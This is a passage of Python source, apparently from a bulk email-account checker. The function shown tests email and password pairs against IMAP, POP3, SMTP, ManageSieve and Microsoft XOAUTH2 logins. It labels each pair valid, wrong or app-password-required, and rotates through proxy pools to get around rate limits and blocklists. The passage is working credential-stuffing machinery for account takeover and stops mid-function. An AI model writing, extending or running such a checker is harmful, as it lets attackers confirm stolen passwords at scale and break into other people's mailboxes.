# @@BLOCK 100 CORE_SETUP deps=009,010,011,012,016,017,021,022,023,026,040,058,059,060,067,068,076
def _check_account_core(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
    if trace_logs is None:
        trace_logs = []

    t_start = time.time()
    retryable = False
    net_fail = False
    dns_ok = True

    best_verdict = {"status": None, "detail": "", "host": ""}
    flags = {"saw_407": False, "saw_nonproxy": False, "saw_server": False,
             "saw_login_drop": False}
    force_direct = {"flag": False}
    host_407 = {}
    net_failed_hosts = set()
    retries_by_host = {}
    conn_rotated = {}
    used_proxies = set()
    retried_407_subusers = set()
    acct_407_total = 0
    MAX_ROTATIONS = max(0, int(CFG.get("MAX_ROTATIONS", MAX_ROTATIONS_DEFAULT)))

    try:
        if conf.get("type") == "zero_access":
            trace_logs.append("Architecture: Zero-Access / Bridge detected.")
            return None, NEED_APP_PASSWORD, "Zero-Access Architecture | Protocol: Local API / Bridge", None, trace_logs

        proxy_mode = CFG.get("PROXY_MODE", "fallback")
        prefer_insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
        try_starttls = bool(CFG.get("TRY_STARTTLS", True))
        try_alt_user = bool(CFG.get("TRY_ALT_USERNAME", True))
        max_hosts = max(1, int(CFG.get("MAX_HOSTS_PER_DOMAIN", 3)))
        configured_to = max(4.0, float(CFG.get("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL)))
        same_host_retries = max(0, int(CFG.get("SAME_HOST_RETRIES", SAME_HOST_RETRIES_DEFAULT)))

        flags_p = protocol_flags()
        allow_imap = flags_p["imap"]
        allow_pop = flags_p["pop"]
        allow_smtp = flags_p["smtp"]
        allow_sieve = flags_p["sieve"]
        if not (allow_imap or allow_pop or allow_smtp or allow_sieve):
            allow_imap = True

        users = username_candidates(email) if try_alt_user else [email]
        primary_user = users[0]

        def note_verdict(st_val, detail, host="", force=False):
            """Record a verdict, keeping the strongest one.

            force=True is for a DEFINITIVE answer that must not be suppressed by
            an earlier, vaguer one (Microsoft XOAUTH2 AADSTS50126).
            """
            if st_val not in (VALID, WRONG, APP, RBL, LOGIN_DROPPED, UNKNOWN,
                              DNS_FAILED, SMTP_FAILED):
                return
            cur = best_verdict["status"]
            if force or cur is None or _VERDICT_RANK.get(st_val, 0) > _VERDICT_RANK.get(cur, 0):
                best_verdict["status"] = st_val
                best_verdict["detail"] = detail
                best_verdict["host"] = host or ""
                trace_logs.append(f"Verdict retained for this account: [{st_val}] ({detail})")

        px = None
        if proxy_pool and proxy_mode != "off":
            if proxy_mode == "sticky":
                if not thread_state.get("sticky_proxy"):
                    thread_state["sticky_proxy"] = sample_alive_proxy(domain=domain)
                px = thread_state["sticky_proxy"]
            else:
                px = sample_alive_proxy(domain=domain)
            if px:
                used_proxies.add(px)

        _all_imap = [h for h in (conf.get("imap") or []) if h]
        _imap_cap = max(2, min(4, max_hosts))
        imap_hosts = _dedupe_hosts_by_ip(_all_imap, cap=_imap_cap)
        _all_pop = [h for h in (conf.get("pop") or conf.get("pop3") or []) if h]
        _pop_only = [h for h in _all_pop if h not in imap_hosts]
        pop_hosts = (_pop_only or _all_pop)[:1]
        _smtp_hosts = _smtp_hosts_for(domain) if allow_smtp else []
        if len(_all_imap) > len(imap_hosts):
            trace_logs.append(
                f"Host expansion: {len(imap_hosts)}/{len(_all_imap)} IMAP candidate(s) kept "
                f"(cap {_imap_cap}, duplicate IPs collapsed).")
        if allow_smtp and not _smtp_hosts:
            trace_logs.append("SMTP is selected but no SMTP submission host was discovered "
                              "for this domain.")

        if domain and domain not in imap_hosts and len(imap_hosts) < 4 and fast_fail_dns_check(domain):
            imap_hosts = imap_hosts + [domain]
            trace_logs.append(f"Fallback host '{domain}' force-included as a final rung "
                              f"(apex resolves).")

        if domain in imap_hosts:
            imap_hosts = [h for h in imap_hosts if h != domain] + [domain]

        if domain.endswith("windstream.net") or domain.endswith("kinetic.net"):
            _drop = {domain, "secure.windstream.net", "webmail.windstream.net"}
            _kept = [h for h in imap_hosts if h.lower() not in _drop]
            if _kept and len(_kept) != len(imap_hosts):
                trace_logs.append(
                    f"Web-only hosts dropped from the IMAP ladder (never answer on 993/143): "
                    f"{[h for h in imap_hosts if h.lower() in _drop]}")
                imap_hosts = _kept

        _web = [h for h in imap_hosts if h.lower() in WEB_ONLY_HOSTS]
        if _web and len(_web) < len(imap_hosts):
            imap_hosts = [h for h in imap_hosts if h.lower() not in WEB_ONLY_HOSTS] + _web

        trace_logs.append(
            f"IMAP ladder after web-only drop: {imap_hosts} "
            f"(POP {pop_hosts} | SMTP {_smtp_hosts})")

        _local_roots = tuple(_domain_roots(domain))

        def _is_local_host(h):
            hl = (h or "").lower().strip()
            if not hl:
                return False
            for r in _local_roots:
                if hl == r or hl.endswith("." + r):
                    return True
            return False

        domain_local_hosts = {h for h in (imap_hosts + pop_hosts + _smtp_hosts)
                              if _is_local_host(h)}

        tried_hosts = set()
        # Hosts that already answered WRONG / NEED_APP_PASSWORD.  A verdict from
        # ONE host is PROVISIONAL until a second independent host agrees, a second
        # RUNG of the same host agrees, or nothing is left to dial.
        wrong_hosts = set()
        wrong_rungs = set()          # FIX P0-1: (server, proto, port)
        app_hosts = set()
        app_rungs = set()
        confirm_wrong = bool(CFG.get("CONFIRM_WRONG_ACROSS_HOSTS", True))

        trace_logs.append(
            f"Protocols selected -> {' + '.join(active_protocols())} "
            f"(SMTP/ManageSieve are CONFIRM-ONLY: a failure never lowers a verdict).")
        trace_logs.append(f"Host order -> IMAP {imap_hosts} | POP {pop_hosts} | SMTP {_smtp_hosts}")
        if proxy_pool and proxy_mode != "off":
            trace_logs.append(f"Proxy pool: {len(proxy_pool)} node(s) alive, "
                              f"{quarantine_size()} quarantined for 407.")
        trace_logs.append(
            f"Concurrency: host cap {CFG.get('HOST_CONCURRENCY')} · "
            f"per-IP cap {CFG.get('PROXY_IP_CONCURRENCY')} · "
            f"per-subuser cap {CFG.get('PROXY_SUBUSER_CONCURRENCY')} · "
            f"proxy cap {CFG.get('PROXY_CONCURRENCY')} · "
            f"same-host retries {same_host_retries} · max rotations {MAX_ROTATIONS} · "
            f"rotation {'RANDOM' if CFG.get('RANDOM_ROTATION', True) else 'round-robin'}")
        trace_logs.append(f"WRONG confirmation across hosts: "
                          f"{'ON' if confirm_wrong else 'OFF (one-rung)'}")

        resolvable = [h for h in (imap_hosts + pop_hosts + _smtp_hosts) if fast_fail_dns_check(h)]
        dns_ok = bool(resolvable)
        if dns_ok:
            trace_logs.append(f"Fast-fail DNS check OK: {len(resolvable)}/"
                              f"{len(imap_hosts) + len(pop_hosts) + len(_smtp_hosts)} "
                              f"hosts resolve locally")
        else:
            trace_logs.append("Fast-fail DNS check failed: no candidate host resolves locally")
            if not proxy_pool or proxy_mode == "off":
                return None, DNS_FAILED, "Fast-fail DNS check failed: no host resolves locally", None, trace_logs

        imap_set = set(imap_hosts)
        pop_only = [h for h in pop_hosts if h not in imap_set]
        pop_dup = [h for h in pop_hosts if h in imap_set]

        primary_plan = []
        if allow_imap and imap_hosts:
            primary_plan.append((RUNG_IMAP, imap_hosts[0], 993, "ssl"))
        if allow_pop:
            for _ph in pop_only:
                primary_plan.append((RUNG_POP, _ph, 995, "ssl"))
        if allow_imap:
            for _h in imap_hosts[1:]:
                primary_plan.append((RUNG_IMAP, _h, 993, "ssl"))
        if allow_smtp:
            for _sh in _smtp_hosts:
                for _sp, _sm in SMTP_RUNG_PORTS:
                    primary_plan.append((RUNG_SMTP, _sh, _sp, _sm))
        if allow_sieve and imap_hosts:
            primary_plan.append((RUNG_SIEVE, imap_hosts[0], SIEVE_PORT, "starttls"))

        fallback_plan = []
        if allow_pop:
            fallback_plan += [(RUNG_POP, h, 995, "ssl") for h in pop_dup]
        if try_starttls and allow_imap:
            fallback_plan += [(RUNG_IMAP, h, 143, "starttls") for h in imap_hosts]
            fallback_plan += [(RUNG_IMAP, h, 143, "plain") for h in imap_hosts[:2]]
        if try_starttls and allow_pop:
            for h in pop_hosts:
                fallback_plan += [(RUNG_POP, h, 110, "starttls")]
                fallback_plan += [(RUNG_POP, h, 110, "plain")]

        if not primary_plan:
            trace_logs.append("No candidate hosts for this domain under the selected protocols.")
            return None, FAILED, "no candidate hosts for the selected protocols", None, trace_logs

        rung_cost = max(RUNG_COST_MIN, min(configured_to, RUNG_COST_MAX))
        work_floor = (len(primary_plan) * rung_cost * WORK_FLOOR_FACTOR) + WORK_FLOOR_PAD
        budget = max(12.0, float(CFG.get("ACCOUNT_DEADLINE", DEADLINE_NORMAL)) * 0.95)
        if work_floor > budget:
            trace_logs.append(
                f"Budget floored to fit the work: {work_floor:.0f}s "
                f"({len(primary_plan)} rung(s) x {rung_cost:.0f}s x {WORK_FLOOR_FACTOR} "
                f"+ {WORK_FLOOR_PAD:.0f}s) instead of the {budget:.0f}s the Deadline "
                f"slider allows.")
            budget = work_floor

        proxy_deadline = t_start + (budget * PROXY_TOTAL_FRAC)
        proxy_primary_deadline = t_start + (budget * PROXY_PRIMARY_FRAC)
        hard_deadline = t_start + budget
        direct_primary_deadline = t_start + (budget * DIRECT_PRIMARY_FRAC)
        trace_logs.append(
            f"Account window {budget:.0f}s -> proxy "
            f"{budget * PROXY_PRIMARY_FRAC:.0f}s-{budget * PROXY_TOTAL_FRAC:.0f}s / "
            f"direct {budget * DIRECT_PRIMARY_FRAC:.0f}s-{budget:.0f}s "
            f"(legacy 143/110 rungs hold a reserved tail slice of each phase).")

        def _is_timeout(err):
            s = str(err).lower()
            return "timed out" in s or "timeout" in s

        def _do_attempt_raw(proto, server, port, tls_mode, user, px_used, attempt_to):
            if proto == RUNG_IMAP:
                if tls_mode == "ssl":
                    imap_once(user, password, server, px_used, insecure=prefer_insecure,
                              port=port, attempt_timeout=attempt_to)
                elif tls_mode == "starttls":
                    imap_starttls_once(user, password, server, px_used,
                                       insecure=prefer_insecure, port=port,
                                       attempt_timeout=attempt_to)
                else:
                    imap_plain_once(user, password, server, px_used, port=port,
                                    attempt_timeout=attempt_to)
            elif proto == RUNG_POP:
                if tls_mode == "ssl":
                    pop_once(user, password, server, px_used, insecure=prefer_insecure,
                             port=port, attempt_timeout=attempt_to)
                elif tls_mode == "starttls":
                    pop_starttls_once(user, password, server, px_used,
                                      insecure=prefer_insecure, port=port,
                                      attempt_timeout=attempt_to)
                else:
                    pop_plain_once(user, password, server, px_used, port=port,
                                   attempt_timeout=attempt_to)
            elif proto == RUNG_SMTP:
                smtp_auth_once(user, password, server, px_used, insecure=prefer_insecure,
                               port=port, attempt_timeout=attempt_to)
            else:
                sieve_auth_once(user, password, server, px_used, insecure=prefer_insecure,
                                port=port, attempt_timeout=attempt_to)

        def do_attempt(proto, server, port, tls_mode, user, px_used, attempt_to, deadline_ts=None):
            """Serialised per destination host, per proxy IP, per sub-user, globally."""
            gate = _host_gate(server)
            got_host = gate.acquire(timeout=max(2.0, attempt_to))
            try:
                if deadline_ts is not None:
                    _rem = deadline_ts - time.time()
                    attempt_to = max(2.5, min(attempt_to, _rem)) if _rem > 1.0 else 2.0
                if int(port) in LEGACY_PORTS:
                    attempt_to = min(attempt_to, LEGACY_RUNG_TIMEOUT)
                if px_used:
                    got_proxy = _proxy_gate().acquire(timeout=_gate_wait(attempt_to))
                    try:
                        _pxinfo = parse_proxy(px_used)
                        ipg = _ip_gate(_pxinfo["host"] if _pxinfo else None)
                        got_ip = ipg.acquire(timeout=_gate_wait(attempt_to))
                        try:
                            sg = _subuser_gate((_pxinfo.get("user") or "").lower() if _pxinfo else "")
                            got_sub = sg.acquire(timeout=_gate_wait(attempt_to))
                            try:
                                _do_attempt_raw(proto, server, port, tls_mode, user,
                                                px_used, attempt_to)
                            finally:
                                if got_sub:
                                    sg.release()
                        finally:
                            if got_ip:
                                ipg.release()
                    finally:
                        if got_proxy:
                            _proxy_gate().release()
                else:
                    _do_attempt_raw(proto, server, port, tls_mode, user, px_used, attempt_to)
            finally:
                if got_host:
                    gate.release()

        err_text = ""
        attempt_to_ref = [configured_to]
# @@END 100 CORE_SETUP

# @@BLOCK 101 CORE_VERDICT_HELPERS deps=022,023,067,100
        def try_ms_xoauth2(server, px_used, attempt_to, err_snapshot=""):
            nonlocal acct_407_total, err_text
            if not MS_OAUTH_OK:
                return None
            if server.lower() not in ms_oauth.MS_IMAP_HOSTS:
                return None
            if not ms_oauth.should_try_ms_xoauth2(server, err_snapshot or err_text, domain):
                return None
            try:
                exists, claims = ms_oauth.imap_xoauth2_once(
                    email, password, server, ProxyIMAP4SSL, port=993,
                    proxy_str=px_used, insecure=prefer_insecure,
                    attempt_timeout=attempt_to)
                who = claims.get("preferred_username") or email
                trace_logs.append(f"{px_tag(px_used)} XOAUTH2 VALID on {server}:993 "
                                  f"(EXISTS={exists}, as={who}, exp={claims.get('exp')})")
                return (server, VALID,
                        f"{px_tag(px_used)} XOAUTH2 | Host: {server} | Port: 993 | "
                        f"real account password (basic auth disabled)",
                        px_used, trace_logs)
            except ms_oauth.MsTokenTransport as te:
                trace_logs.append(f"{px_tag(px_used)} XOAUTH2 transport issue -> verdict "
                                  f"unchanged ({str(te)[:90]})")
                return None
            except ProxyAuthError as pae:
                err_text = str(pae)
                flags["saw_407"] = True
                record_proxy_attempt(px_used, success=False,
                                     is_network_error=True, is_proxy_auth=True)
                host_407[server] = host_407.get(server, 0) + 1
                acct_407_total += 1
                trace_logs.append(
                    f"{px_tag(px_used)} -> PROXY 407 (XOAUTH2) {server}:993: "
                    f"{err_text[:200]} [Classified: proxy_unhealthy]")
                return None
            except ms_oauth.MsTokenRejected as tr:
                if tr.verdict == "wrong_password":
                    # force=True: AADSTS50126 is definitive.  Without it the IMAP
                    # rung's APP (priority 1) suppressed this WRONG (priority 2).
                    note_verdict(WRONG, f"XOAUTH2 token {tr.code} -> wrong password",
                                 server, force=True)
                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected "
                                      f"[{tr.code}] -> wrong password (definitive)")
                elif tr.verdict == "need_app_password":
                    note_verdict(APP, f"XOAUTH2 token {tr.code} -> MFA, app password required",
                                 server, force=True)
                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected "
                                      f"[{tr.code}] -> MFA, app password required")
                else:
                    trace_logs.append(f"{px_tag(px_used)} XOAUTH2 token rejected "
                                      f"[{tr.code}] -> no verdict change")
                return None
            except Exception as xe:
                trace_logs.append(f"{px_tag(px_used)} XOAUTH2 failed: {str(xe)[:90]}")
                return None

        def _rotate_to_fresh(px_used, seen_px, why, keep_node=False):
            """keep_node=True holds the node that just REACHED the mail server."""
            if keep_node:
                trace_logs.append(f"Keeping proxy ({why}) -> {px_tag(px_used)}")
                return px_used, False
            newpx = sample_alive_proxy(exclude=seen_px, avoid=seen_px, domain=domain)
            if newpx and newpx not in seen_px:
                seen_px.add(newpx)
                trace_logs.append(f"Rotating proxy ({why}) -> {px_tag(newpx)}")
                return newpx, True
            return px_used, False

        def _handle_app_or_wrong(st_val, proto, server, port, user, u_idx, px_used, seen_px,
                                 had_net, saw_retry):
            """Shared body for the APP / WRONG verdict handling.

            Returns (result_tuple_or_None, had_net, saw_retry, advance).
              * result is not None      -> RETURN it
              * advance is True         -> keep going (PROVISIONAL)
              * advance is "retry_user" -> retry this host as the LOCAL PART

            FIX P0-1 / P0-4: this helper previously carried a SECOND, unreachable
            copy of the WRONG block after the first `return`, and the confirmation
            gate counted only LOCAL hosts - while the current host was already in
            tried_hosts.  On any domain whose only local candidate was one
            imap.<domain> box the gate therefore confirmed on the FIRST rung and
            a valid combo was reported WRONG without POP3, the sibling hosts or
            143/110 ever being dialled.
            """
            if st_val == APP:
                xres = try_ms_xoauth2(server, px_used, attempt_to_ref[0], err_text)
                if xres:
                    return xres, had_net, saw_retry, False
                if u_idx + 1 < len(users):
                    flags["saw_server"] = True
                    px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry",
                                                    keep_node=True)
                    trace_logs.append(f"{px_tag(px_used)} App-password signal as '{user}' -> "
                                      f"retrying same host as local-part '{users[u_idx + 1]}'")
                    return None, had_net, saw_retry, "retry_user"
                app_hosts.add(server)
                app_rungs.add((server, proto, port))
                _untried_local = [h for h in domain_local_hosts if h not in tried_hosts]
                _conf_pool = [h for h in (imap_hosts + pop_hosts) if h not in tried_hosts]
                _rungs_left_here = [r for r in (fallback_plan or ())
                                    if r[1] == server
                                    and (r[1], r[0], r[2]) not in wrong_rungs
                                    and (r[1], r[0], r[2]) not in app_rungs]
                _confirmed = ((len(app_hosts) >= 2) or (len(app_rungs) >= 2)
                              or (not _conf_pool and not _rungs_left_here))
                if (not confirm_wrong) or _confirmed:
                    # A definitive XOAUTH2 WRONG outranks a basic-auth "app
                    # password" signal - return the stronger one.
                    if best_verdict["status"] == WRONG:
                        return (None, WRONG,
                                best_verdict["detail"] + _wrong_detail_note(domain, password),
                                px_used, trace_logs), had_net, saw_retry, False
                    return (None, APP, f"{px_tag(px_used)} {proto} {server} -> {st_val}",
                            px_used, trace_logs), had_net, saw_retry, False
                trace_logs.append(
                    f"{px_tag(px_used)} APP on {server} -> PROVISIONAL "
                    f"({len(app_hosts)} host(s) agreed, {len(_conf_pool)} candidate(s) "
                    f"still untried, {len(_untried_local)} local, "
                    f"{len(app_rungs)} rung(s) dialled) -> continuing")
                return None, had_net, saw_retry, True

            # ---- WRONG (single copy - the duplicate after the first return is gone) ----
            # The local-part retry runs FIRST: a legacy Zimbra / cPanel / Dovecot
            # front answers AUTHENTICATIONFAILED for 'user@domain' and accepts
            # 'user'.  It must also run BEFORE wrong_hosts.add(), because the host
            # has not been authoritatively tested until every username candidate is
            # exhausted - otherwise one host can satisfy the confirmation gate on a
            # username it was always going to reject.
            if u_idx + 1 < len(users):
                flags["saw_server"] = True
                px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry",
                                                keep_node=True)
                trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> retrying same "
                                  f"host as local-part '{users[u_idx + 1]}'")
                return None, had_net, saw_retry, "retry_user"

            wrong_hosts.add(server)
            wrong_rungs.add((server, proto, port))
            _untried_local = [h for h in domain_local_hosts if h not in tried_hosts]
            _conf_pool = [h for h in (imap_hosts + pop_hosts) if h not in tried_hosts]
            # FIX P0-1b: this host's still-undialled 143/110 rungs count as
            # "something left to dial". Without this, a single-IMAP-host domain
            # confirmed on rung 1 and skipped the whole fallback plan + direct sweep.
            _rungs_left_here = [r for r in (fallback_plan or ())
                                if r[1] == server
                                and (r[1], r[0], r[2]) not in wrong_rungs
                                and (r[1], r[0], r[2]) not in app_rungs]
            _confirmed = ((len(wrong_hosts) >= 2) or (len(wrong_rungs) >= 2)
                          or (not _conf_pool and not _rungs_left_here))

            if (not confirm_wrong) or _confirmed:
                return (None, WRONG,
                        f"{px_tag(px_used)} {proto} {server} -> {st_val}"
                        + _wrong_detail_note(domain, password),
                        px_used, trace_logs), had_net, saw_retry, False

            trace_logs.append(
                f"{px_tag(px_used)} WRONG on {server} -> PROVISIONAL "
                f"({len(wrong_hosts)} host(s) agreed, {len(_conf_pool)} candidate(s) "
                f"still untried, {len(_untried_local)} local, "
                f"{len(wrong_rungs)} rung(s) dialled) -> continuing the ladder")
            return None, had_net, saw_retry, True
# @@END 101 CORE_VERDICT_HELPERS

# @@BLOCK 102 CORE_SWEEP deps=016,100,101
        def sweep(px_used, rungs, deadline_ts, label, allow_rotate=True):
            nonlocal acct_407_total, err_text
            had_net = False
            saw_retry = False
            if not rungs:
                return None, had_net, saw_retry

            left = deadline_ts - time.time()
            if left <= 1.5:
                trace_logs.append(f"{label}: no window left ({left:.1f}s).")
                return None, had_net, saw_retry

            per_to = max(3.0, min(configured_to, left / max(1, len(rungs))))
            trace_logs.append(f"--- {label}: {len(rungs)} rung(s), ~{per_to:.1f}s each, "
                              f"{left:.1f}s window ---")

            for rung_idx, (proto, server, port, tls_mode) in enumerate(rungs):
                if time.time() > deadline_ts:
                    trace_logs.append(f"{label}: window reached; stopping this pass "
                                      f"({len(rungs) - rung_idx} rung(s) not attempted).")
                    break

                tried_hosts.add(server)

                if px_used and proxy_mode != "off" and proxy_is_quarantined(px_used):
                    _fresh = sample_alive_proxy(domain=domain, avoid=used_proxies)
                    if _fresh and _fresh != px_used:
                        px_used = _fresh
                        used_proxies.add(_fresh)
                        trace_logs.append(f"Quarantined node in hand -> switched to fresh "
                                          f"node {px_tag(px_used)}")

                rotations_left = MAX_ROTATIONS if (allow_rotate and px_used
                                                   and proxy_mode != "off") else 0
                seen_px = used_proxies
                acct_407 = 0

                while True:
                    if time.time() > deadline_ts:
                        break

                    _rem = deadline_ts - time.time()
                    if _rem <= 1.0:
                        break
                    attempt_to = max(2.5, min(per_to, _rem))
                    attempt_to_ref[0] = attempt_to

                    trace_logs.append(f"{px_tag(px_used)} Attempting {proto} "
                                      f"{tls_mode.upper()} -> Host: {server}:{port}")
                    server_level_fail = False
                    rotate_now = False
                    retry_same = False
                    retry_same_node = False
                    proxy_dead = False
                    err_text = ""

                    for u_idx, user in enumerate(users):
                        try:
                            do_attempt(proto, server, port, tls_mode, user, px_used,
                                       attempt_to, deadline_ts)
                            record_proxy_attempt(px_used, success=True)
                            note_verdict(VALID, f"{proto} {server}:{port}", server)
                            note = "" if user == primary_user else f" | User: {user} (local-part)"
                            trace_logs.append(f"{px_tag(px_used)} Post-auth {proto} "
                                              f"verification OK on {server}:{port}{note}")
                            return (server, VALID,
                                    f"{px_tag(px_used)} {proto} | Host: {server} | "
                                    f"Port: {port}{note}",
                                    px_used, trace_logs), had_net, saw_retry

                        except ProxyAuthError as pae:
                            err_text = str(pae)
                            flags["saw_407"] = True
                            record_proxy_attempt(px_used, success=False,
                                                 is_network_error=True, is_proxy_auth=True)
                            host_407[server] = host_407.get(server, 0) + 1
                            acct_407 += 1
                            acct_407_total += 1
                            trace_logs.append(
                                f"{px_tag(px_used)} -> PROXY 407 {proto} {server}:{port}: "
                                f"{err_text[:200]} [Classified: proxy_unhealthy]")
                            proxy_dead = True
                            rotate_now = True
                            # A 407 is a proxy answer, not a username answer: break
                            # the username loop so the retry below is not preceded
                            # by a second dial through the same dead node.
                            server_level_fail = True
                            _su = _subuser_of(px_used)
                            if px_used and _su and _su not in retried_407_subusers:
                                retried_407_subusers.add(_su)
                                retry_same_node = True
                                proxy_dead = False
                                rotate_now = False

                        except ProxyTransportError as pte:
                            err_text = str(pte)
                            flags["saw_nonproxy"] = True
                            had_net = True
                            net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False,
                                                 is_network_error=True, is_proxy_auth=False)
                            trace_logs.append(
                                f"{px_tag(px_used)} -> PROXY TRANSPORT {proto} {server}:{port}: "
                                f"{err_text[:200]} [Classified: {FAILED}]")
                            server_level_fail = True
                            rotate_now = True

                        except (SmtpAuthError, SieveAuthError) as cnf:
                            err_text = str(cnf)
                            flags["saw_nonproxy"] = True
                            flags["saw_server"] = True
                            record_proxy_attempt(px_used, success=False, is_network_error=False)
                            trace_logs.append(
                                f"{px_tag(px_used)} -> CONFIRM {proto} {server}:{port}: "
                                f"{err_text[:140]} [Classified: {WRONG} - confirm-only]")
                            note_verdict(WRONG, f"{proto} {server}:{port} -> {WRONG} "
                                                 f"(confirm-only)", server)
                            if u_idx + 1 < len(users):
                                continue
                            server_level_fail = True
                            rotate_now = False

                        except (SmtpSoftError, SieveSoftError) as soft:
                            err_text = str(soft)
                            flags["saw_nonproxy"] = True
                            flags["saw_server"] = True
                            record_proxy_attempt(px_used, success=False, is_network_error=False)
                            trace_logs.append(
                                f"{px_tag(px_used)} -> INCONCLUSIVE {proto} {server}:{port}: "
                                f"{err_text[:140]} [no verdict change]")
                            server_level_fail = True
                            rotate_now = False

                        except ssl.SSLError as ssl_err:
                            err_text = str(ssl_err)
                            st_val = classify_error(ssl_err, domain)
                            flags["saw_nonproxy"] = True
                            flags["saw_server"] = True
                            if st_val == CONNECTION_FAILED:
                                had_net = True
                                net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False,
                                                 is_network_error=(st_val == CONNECTION_FAILED))
                            trace_logs.append(f"{px_tag(px_used)} -> TLS FAILED {proto} "
                                              f"{server}:{port}: {err_text[:140]} "
                                              f"[Classified: {st_val}]")
                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)
                            server_level_fail = True
                            rotate_now = _is_proxy_level_error(err_text) or st_val == CONNECTION_FAILED

                        except (socket.timeout, TimeoutError) as to_err:
                            err_text = str(to_err)
                            flags["saw_nonproxy"] = True
                            had_net = True
                            net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False, is_network_error=True)
                            trace_logs.append(f"{px_tag(px_used)} -> TIMEOUT {proto} "
                                              f"{server}:{port}: {err_text[:140]} "
                                              f"[Classified: {FAILED}]")
                            server_level_fail = True

                            _kind = _timeout_kind(to_err)
                            if _kind == "connect":
                                if px_used and proxy_mode != "off" and not conn_rotated.get(server):
                                    conn_rotated[server] = True
                                    rotate_now = True
                                    trace_logs.append(f"{px_tag(px_used)} Connect-level timeout "
                                                      f"-> rotating node ONCE, no in-place retry")
                                else:
                                    rotate_now = False
                                    trace_logs.append(f"{px_tag(px_used)} Connect-level timeout "
                                                      f"-> advancing past {server}:{port} "
                                                      f"(no in-place retry)")
                            else:
                                rotate_now = True
                                if (retries_by_host.get(server, 0) < same_host_retries
                                        and (deadline_ts - time.time()) > 7.0):
                                    retries_by_host[server] = retries_by_host.get(server, 0) + 1
                                    retry_same = True

                        except (socket.error, ConnectionRefusedError) as sock_err:
                            err_text = str(sock_err)
                            flags["saw_nonproxy"] = True
                            had_net = True
                            net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False, is_network_error=True)
                            trace_logs.append(f"{px_tag(px_used)} -> SOCKET FAILED {proto} "
                                              f"{server}:{port}: {err_text[:140]} "
                                              f"[Classified: {FAILED}]")
                            server_level_fail = True
                            rotate_now = True

                        except (imaplib.IMAP4.error, poplib.error_proto) as proto_err:
                            err_text = str(proto_err)
                            st_val = classify_error(proto_err, domain)
                            flags["saw_nonproxy"] = True
                            flags["saw_server"] = True
                            record_proxy_attempt(px_used, success=False, is_network_error=False)
                            trace_logs.append(f"{px_tag(px_used)} -> AUTH {proto} "
                                              f"{server}:{port}: {err_text[:140]} "
                                              f"[Classified: {st_val}]")
                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)

                            if st_val == LOGIN_DROPPED:
                                flags["saw_login_drop"] = True
                                trace_logs.append(
                                    f"{px_tag(px_used)} Server ANSWERED then closed the socket "
                                    f"(* BYE) on {proto} {server}:{port} -> server-side, "
                                    f"password still untested; continuing the ladder")

                            if st_val in (APP, WRONG):
                                res, had_net, saw_retry, act = _handle_app_or_wrong(
                                    st_val, proto, server, port, user, u_idx, px_used, seen_px,
                                    had_net, saw_retry)
                                if res is not None:
                                    return res, had_net, saw_retry
                                if act == "retry_user":
                                    continue
                                server_level_fail = True
                                rotate_now = False
                            elif st_val == RETRY:
                                saw_retry = True
                                server_level_fail = True
                                if "lookup failed" in err_text.lower():
                                    rotate_now = False
                                    trace_logs.append(f"{px_tag(px_used)} 'Lookup failed' on "
                                                      f"{server}:{port} -> advancing to next "
                                                      f"host (no proxy rotation)")
                                else:
                                    rotate_now = True
                            elif st_val == RBL:
                                trace_logs.append(f"{px_tag(px_used)} RBL block on "
                                                  f"{server}:{port} -> IP flagged by server, "
                                                  f"advancing")
                                server_level_fail = True
                            elif u_idx + 1 < len(users) and st_val in (UNKNOWN, LOGIN_DROPPED):
                                flags["saw_server"] = True
                                px_used, _ok = _rotate_to_fresh(px_used, seen_px,
                                                                "local-part retry", keep_node=True)
                                trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> "
                                                  f"retrying same host as local-part "
                                                  f"'{users[u_idx + 1]}'")
                                continue
                            elif st_val == LOGIN_DROPPED:
                                server_level_fail = True
                                rotate_now = False
                                trace_logs.append(
                                    f"{px_tag(px_used)} LOGIN_DROPPED on {server}:{port} -> "
                                    f"advancing the ladder (POP3 / other hosts still get a turn)")
                            else:
                                server_level_fail = True
                                if (st_val == CONNECTION_FAILED
                                        and retries_by_host.get(server, 0) < same_host_retries
                                        and (deadline_ts - time.time()) > 7.0):
                                    retries_by_host[server] = retries_by_host.get(server, 0) + 1
                                    retry_same = True

                        except Exception as e:
                            err_text = str(e)
                            st_val = classify_error(e, domain)
                            proxy_level = _is_proxy_level_error(err_text)
                            if proxy_level:
                                flags["saw_407"] = True
                                record_proxy_attempt(px_used, success=False,
                                                     is_network_error=True, is_proxy_auth=True)
                                host_407[server] = host_407.get(server, 0) + 1
                                acct_407 += 1
                                acct_407_total += 1
                            else:
                                flags["saw_nonproxy"] = True
                                if "Fast-fail DNS check" not in err_text:
                                    flags["saw_server"] = True
                            if _is_timeout(e):
                                had_net = True
                                net_failed_hosts.add(server)
                            if st_val == CONNECTION_FAILED:
                                had_net = True
                                net_failed_hosts.add(server)
                            record_proxy_attempt(px_used, success=False,
                                                 is_network_error=(st_val == CONNECTION_FAILED))
                            trace_logs.append(f"{px_tag(px_used)} -> FAILED {proto} "
                                              f"{server}:{port}: {err_text[:140]} "
                                              f"[Classified: {st_val}]")
                            note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)

                            if st_val == LOGIN_DROPPED:
                                flags["saw_login_drop"] = True
                                trace_logs.append(
                                    f"{px_tag(px_used)} Server ANSWERED then closed the socket "
                                    f"(* BYE) on {proto} {server}:{port} -> server-side, "
                                    f"password still untested; continuing the ladder")

                            if st_val in (APP, WRONG):
                                res, had_net, saw_retry, act = _handle_app_or_wrong(
                                    st_val, proto, server, port, user, u_idx, px_used, seen_px,
                                    had_net, saw_retry)
                                if res is not None:
                                    return res, had_net, saw_retry
                                if act == "retry_user":
                                    continue
